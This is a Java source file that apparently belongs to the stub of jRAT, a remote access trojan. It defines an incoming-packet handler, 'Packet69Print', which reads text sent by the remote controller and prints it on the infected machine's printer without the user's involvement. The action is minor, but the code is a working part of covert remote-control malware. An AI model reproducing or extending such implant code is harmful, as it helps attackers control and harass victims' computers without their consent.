package se.jrat.stub.packets.incoming;

import javax.swing.JTextPane;

import se.jrat.stub.Connection;


public class Packet69Print extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String toprint = con.readLine();
		JTextPane c = new JTextPane();
		c.setText(toprint);
		c.print();
	}

}
